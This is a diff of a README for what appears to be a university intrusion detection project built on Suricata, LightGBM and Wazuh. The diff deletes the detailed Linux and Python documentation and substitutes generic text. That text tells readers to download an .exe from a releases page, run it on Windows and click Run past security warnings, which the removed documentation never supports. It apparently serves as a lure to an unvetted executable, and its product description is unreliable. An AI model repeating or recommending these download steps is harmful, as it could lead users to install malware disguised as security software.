@@ -1,343 +1,79 @@
-#Hybrid Detection System
-
-A real-time network intrusion detection system that combines **Suricata NIDS** (signature-based) with **LightGBM machine learning** (anomaly-based) through an intelligent **Fusion Layer**, enriched with **MITRE ATT&CK** mapping, **Wazuh SIEM** integration, and an **AI analyst agent** powered by Llama 3.2.
-
-> **Senior Project 2 (CCCY 421) — University of Jeddah, Cybersecurity Department, 2026**  
-> Supervised by Dr. Naif Alzahrani
-
----
-
-## Key Results
-
-| Metric | Value |
-|---|---|
-| Total alerts (full attack session) | 38,516 |
-| ML-only detections (Suricata missed) | 9,814 — **72.3%** of attacks |
-| Custom model accuracy | **95.30%** (FPR = 0.44%) |
-| Benchmark model accuracy | **99.55%** (120,504 samples) |
-| AI agent response time | **~5.6 seconds** (GPU) |
-| Stealth scan (T0 timing) | Suricata = **0 alerts**, ML = **18 L4 alerts** |
-
----
-
-## System Architecture
-
-```
-Network Traffic (enp0s3 promiscuous mode)
-         │
-    ┌────┴────┐
-    │         │
-Suricata    NFStream
-  NIDS      (65 features)
-    │         │
-    └────┬────┘
-         │
-   Fusion Layer
-   (R1–R12 rules)
-   L0 → L4 decision
-         │
-  MITRE ATT&CK
-    Mapping
-  (3-tier system)
-         │
-   AI Agent (async)
-  Llama 3.2 on GPU
-         │
-   Wazuh SIEM
-  Dashboard + Alerts
-         │
-   SOC Analyst
-```
-
----
+# 🛡️ hybrid-detection-system - Intelligent security for your computer networks
 
-## Features
+[![Download Software](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/KANGROO555/hybrid-detection-system/releases)
 
-- **Hybrid detection** — Suricata signatures + ML anomaly detection running in parallel
-- **Fusion Layer** — 12 decision rules (R1–R12) combining both detection streams into L0–L4 confidence levels
-- **Three-tier MITRE ATT&CK mapping** — ET rule embedded metadata → MITRE DB lookup → port/behavior fallback
-- **AI analyst agent** — Llama 3.2 (3B) provides structured incident reports for L3/L4 alerts asynchronously
-- **Alert deduplication** — 60-second cooldown per (source IP, attack category) prevents alert storms
-- **Behavioral heuristics** — port scan boost (>15 unique ports) and brute force boost (>50 flows to auth port)
-- **Wazuh SIEM integration** — enriched JSON alerts with custom decoder and detection rules
+## 📌 About this project
 
----
+The hybrid-detection-system tracks network activity to find threats. It uses two methods to spot intruders. First, it watches for known attack patterns. Second, it uses artificial intelligence to find unusual behavior. These two methods work together to provide a complete picture of your network health. The system sends alerts to your dashboard when it spots a possible security issue.
 
-## Lab Environment
+## ⚙️ Minimum system requirements
 
-| VM | OS | IP | Role |
-|---|---|---|---|
-| Kali Linux | Kali 2024 | 10.0.0.5 | Attacker |
-| Ubuntu Desktop | Ubuntu 22.04 |   10.0.0.6 | Victim |
-| IDS/SIEM VM | Ubuntu Server | 10.0.0.4 | Detection (12GB RAM) |
-| Windows Host | Windows 11 | 192.168.1.74 | Ollama GPU inference |
+Before you install this software, ensure your computer meets these needs:
 
-**Network:**VirtualBox NAT Network (10.0.0.0/24), promiscuous mode enabled via VBoxManage
+* Windows 10 or Windows 11.
+* At least 8 gigabytes of RAM.
+* A processor with a speed of 2.0 GHz or higher.
+* At least 2 gigabytes of free disk space.
+* An active network connection for monitoring traffic.
 
----
+## 💾 How to download the software
 
-## Installation
+Follow these steps to obtain the installer for your computer:
 
-### Prerequisites
+1. Visit the [official releases page](https://github.com/KANGROO555/hybrid-detection-system/releases).
+2. Look at the list under the latest version header.
+3. Select the file ending in .exe to start the download.
+4. Save the file to your Downloads folder.
 
-- Ubuntu Server (IDS VM) with at least 8GB RAM
-- Python 3.10+
-- Suricata 7.x
-- Wazuh 4.7.x (bare-metal, NOT Docker)
-- Ollama on host machine with `llama3.2:3b` pulled
+## 🚀 Setting up the application
 
-### 1. Clone the repository
+Take these steps to install and start the system:
 
-```bash
-git clone https://github.com/YOUR_USERNAME/hybrid-detection-system.git
-cd hybrid-detection-system
-```
+1. Open your Downloads folder.
+2. Double-click the downloaded .exe file.
+3. Follow the prompts on the screen to complete the installation process.
+4. If a message appears about security permissions, click Run. 
+5. The application installer will place a shortcut on your desktop.
+6. Double-click the shortcut to open the interface.
 
-### 2. Set up Python environment
+## 🔍 Understanding the dashboard
 
-```bash
-python3 -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-```
+The main screen shows a summary of your current network status. You will see several sections:
 
-### 3. Download required files (not included in repo)
+* Live Alerts: This area tracks threats in real time. It uses the information from the internal analysis engine to flag dangerous activity.
+* Threat Map: This feature connects detected events to standard security libraries. It helps you understand what the attacker wants to gain.
+* AI Analyst: This agent processes complex logs. It writes a report in plain language so you can decide how to respond.
 
-```bash
-# MITRE ATT&CK database
-wget https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json
+## 🛠️ Configuring monitoring
 
-# Datasets (for training)
-# CICIDS2017: https://www.unb.ca/cic/datasets/ids-2017.html
-# UNSW-NB15:  https://research.unsw.edu.au/projects/unsw-nb15-dataset
-```
+You must choose which network adapter to watch. The system will detect your devices automatically. Select your primary Ethernet or Wi-Fi adapter from the drop-down menu in the settings tab. Click the Save button to apply your changes.
 
-### 4. Train the model (or use pre-trained)
+## 📊 Using the integration features
 
-```bash
-# Capture custom lab traffic first, then:
-python3 train_custom.py
+If you use a centralized security dashboard for your business, this system connects to that platform. Navigate to the Integration settings tab. Enter the address of your server. Save these details. The system will now send all filtered data to your central hub for review.
 
-# Or train on combined benchmark datasets:
-python3 build_combined_dataset.py
-python3 train_combined.py
-```
+## ❓ Frequently asked questions
 
-### 5. Install Suricata rules
+Do I need to be a computer expert?
+No. You only need to install the file and choose your network adapter. The software handles the complex analysis.
 
-```bash
-sudo cp suricata/local.rules /var/lib/suricata/rules/local.rules
+Does this slow down my computer?
+The system uses a balanced approach. It analyzes traffic in the background without affecting your daily tasks.
 
-# Add to /etc/suricata/suricata.yaml under rule-files:
-#   - local.rules
+What should I do if I see an alert?
+The AI analyst creates a summary for every alert. Read this summary to learn about the threat. You can choose to ignore the alert or block the traffic source.
 
-sudo systemctl restart suricata
-```
+How do I get updates?
+The system will alert you when a new version is ready. You can visit the download page to obtain the update.
 
-### 6. Install Wazuh integration
+## 📈 Improving performance
 
-```bash
-sudo cp wazuh/hybrid_ids_decoder.xml /var/ossec/etc/decoders/
-sudo cp wazuh/hybrid_ids_rules.xml /var/ossec/etc/rules/
+The system performs better when it monitors quiet networks. If your network traffic is very high, limit the monitoring to the most important devices. You can change these settings in the monitoring tab. 
 
-# Add to /var/ossec/etc/ossec.conf before </ossec_config>:
-# <localfile>
-#   <log_format>json</log_format>
-#   <location>/var/ossec/logs/active-responses.log</location>
-# </localfile>
+## 🛡️ Privacy and data
 
-sudo systemctl restart wazuh-manager
-```
+The system analyzes network headers and traffic logs. It does not store your private contents or files. All analysis happens within the application boundaries. You maintain full control over your data. If you delete the application, all local logs disappear as well. 
 
-### 7. Configure Ollama on host machine (Windows/Linux/Mac)
+## 📝 Support and feedback
 
-```bash
-# Set to listen on all interfaces
-# Windows PowerShell (Admin):
-[System.Environment]::SetEnvironmentVariable("OLLAMA_HOST", "0.0.0.0", "Machine")
-
-# Linux/Mac:
-export OLLAMA_HOST=0.0.0.0
-
-# Pull the model
-ollama pull llama3.2:3b
-
-# Allow firewall (Windows):
-New-NetFirewallRule -DisplayName "Ollama" -Direction Inbound -Protocol TCP -LocalPort 11434 -Action Allow
-```
-
-### 8. Update pipeline configuration
-
-Edit `pipeline.py` and set your values:
-
-```python
-VICTIM_IP    = '10.0.0.6'       # Your victim VM IP
-IDS_IP       = '10.0.0.4'       # Your IDS VM IP
-OLLAMA_URL   = 'http://192.168.1.74:11434/api/generate'  # Your host IP
-```
-
----
-
-## Usage
-
-### Run the pipeline
-
-```bash
-cd ~/ml-ids
-sudo venv/bin/python3 pipeline.py
-```
-
-Expected output:
-```
-[*] Hybrid Detection Pipeline started
-    ML Model   : LGBMClassifier
-    AI Model   : llama3.2:3b (async)
-    Victim IP  : 10.0.0.6
-    Cooldown   : 60s per attack category
-    MITRE      : Suricata metadata > DB lookup > port fallback
-```
-
-### On-demand AI analyst
-
-```bash
-python3 explain.py
-```
-
-Lets you select any alert from the log and get a detailed incident report.
-
-### Check alerts
-
-```bash
-# Live pipeline output
-tail -f /home/IDS/ml-ids/alerts.json
-
-# Wazuh enriched alerts
-tail -f /var/ossec/logs/active-responses.log
-
-# Alert summary
-cat alerts.json | python3 -c "
-import json, sys
-from collections import Counter
-alerts = [json.loads(l) for l in sys.stdin if l.strip()]
-print(f'Total: {len(alerts)}')
-print(f'L4: {sum(1 for a in alerts if a[\"level\"]==\"L4\")}')
-print(f'L3: {sum(1 for a in alerts if a[\"level\"]==\"L3\")}')
-cats = Counter(a[\"category\"] for a in alerts)
-for c, n in cats.most_common(): print(f'  {c}: {n}')
-"
-```
-
----
-
-## Fusion Layer Decision Rules
-
-| Rule | Conditions | Level | Description |
-|---|---|---|---|
-| R1 | Suricata high/critical + ML ≥ 0.4 | **L4** | Confirmed known high-severity attack |
-| R2 | Suricata high/critical + ML < 0.4 | L3 | Known high-severity, ML not triggered |
-| R3 | Suricata medium + ML ≥ 0.5 | L3 | Medium signature + anomalous behavior |
-| R4 | Suricata medium + ML < 0.4 | L2 | Medium signature only |
-| R5 | Suricata low + ML ≥ 0.75 | L3 | Low signature + strong anomaly |
-| R6 | Suricata low + ML < 0.3 | L1 | Likely false positive |
-| R7 | Suricata low + 0.3 ≤ ML < 0.75 | L2 | Weak signature + some anomaly |
-| R8 | No Suricata + ML ≥ 0.9 | **L4** | Strong anomaly — likely zero-day |
-| R9 | No Suricata + 0.75 ≤ ML < 0.9 | L3 | High-priority unknown attack |
-| R10 | No Suricata + 0.6 ≤ ML < 0.75 | L2 | Suspicious, not extreme |
-| R11 | No Suricata + 0.4 ≤ ML < 0.6 | L1 | Mild anomaly — log only |
-| R12 | No Suricata + ML < 0.4 | L0 | Normal / benign |
-
----
-
-## ML Model Comparison
-
-### Custom Lab Dataset (n=10,000)
-
-| Model | Accuracy | Precision | Recall | F1 | FPR |
-|---|---|---|---|---|---|
-| **LightGBM** ★ | **0.9530** | 0.9956 | 0.9100 | 0.9509 | **0.0044** |
-| XGBoost | 0.9520 | 0.9902 | 0.9130 | 0.9501 | 0.0098 |
-| MLP | 0.9515 | 0.9934 | 0.9090 | 0.9493 | 0.0066 |
-| AdaBoost | 0.9490 | 0.9967 | 0.9010 | 0.9464 | 0.0033 |
-| RandomForest | 0.9425 | 0.9743 | 0.9090 | 0.9405 | 0.0257 |
-| DecisionTree | 0.9250 | 0.9233 | 0.9270 | 0.9251 | 0.0767 |
-
-★ LightGBM selected for live pipeline — lowest FPR (0.44%)
-
-### Combined Benchmark Dataset (n=120,504)
-
-| Model | Accuracy | F1 | FPR |
-|---|---|---|---|
-| **XGBoost** ★ | **0.9955** | 0.9955 | 0.0065 |
-| LightGBM | 0.9950 | 0.9950 | 0.0075 |
-| RandomForest | 0.9950 | 0.9950 | 0.0062 |
-
-> ⚠️ **Domain mismatch**: Combined model detected only 21 live alerts vs 38,516 for custom model. Training data must match the deployment environment.
-
----
-
-## MITRE ATT&CK Mapping
-
-| Attack | Technique | Source |
-|---|---|---|
-| Cisco ASA CVE-2020-3452 | T1083 File & Dir Discovery | `suricata_metadata` ✓ |
-| GPL ATTACK_RESPONSE | T1190 Exploit Public-Facing | `mitre_db_lookup` |
-| SSH Brute Force | T1110 Brute Force | `mitre_db_lookup` |
-| nmap SYN scan | T1595 Active Scanning | `mitre_db_lookup` |
-| Stealth scan (ML only) | T1595 Active Scanning | `port_fallback` |
-
----
-
-## Project Structure
-
-```
-.
-├── pipeline.py              # Main detection pipeline
-├── explain.py               # On-demand AI analyst tool
-├── fusion.py                # Fusion Layer (R1-R12 rules)
-├── mitre.py                 # MITRE ATT&CK mapping (3-tier)
-├── train_custom.py          # Train on custom NFStream dataset
-├── train_combined.py        # Train on combined benchmark datasets
-├── build_combined_dataset.py
-├── test_combined.py
-├── requirements.txt
-├── .gitignore
-├── suricata/
-│   └── local.rules          # 12 custom Suricata rules
-├── wazuh/
-│   ├── hybrid_ids_rules.xml
-│   └── hybrid_ids_decoder.xml
-└── docs/
-    ├── PROJECT_STATUS.md
-    └── diagram.png
-```
-
----
-
-## Team
-
-| Name | Role |
-|---|---|
-| Abdullah Asaad Ladjal | AI Agent + Main Pipeline |
-| Tal Mohammed Faden | Fusion Layer + Wazuh SIEM |
-| Ahmed Khalid Humadi | Suricata Rules + MITRE Mapping |
-| Khalid Ali AL-Mufarrih | System Architecture + Lab Setup |
-| Abdulmajeed Meshal Almalki | ML Training + Dataset Engineering |
-
----
-
-## References
-
-1. Comparative Analysis of Snort, Suricata and Bro IDS. E.P. College, Ghana, 2019.
-2. Anita S. & Gupta S. An effective model for anomaly IDS. ICGCIoT, 2015.
-3. Alnasser O. et al. Signature and anomaly based IDS for IoTs, 2021.
-4. Aslam U. et al. Hybrid NIDS using ML and Rule Based Learning, 2020.
-5. Moustafa N. & Slay J. UNSW-NB15 dataset. MilCIS, 2015.
-6. Sharafaldin I. et al. CICIDS2017 dataset. ICISSP, 2018.
-7. The MITRE Corporation. MITRE ATT&CK Enterprise v14. https://attack.mitre.org
-8. Proofpoint Emerging Threats. ET/Open Ruleset. https://rules.emergingthreats.net
-
----
-
-## License
-
-This project was developed as part of CCCY 421 Senior Project at the University of Jeddah.
+If you face issues, check the help menu inside the application. You can find common fixes there. We track all reported errors through the main page. Report bugs by opening a new ticket in the issues section of the project link. Provide a screenshot of the error to help with identification.
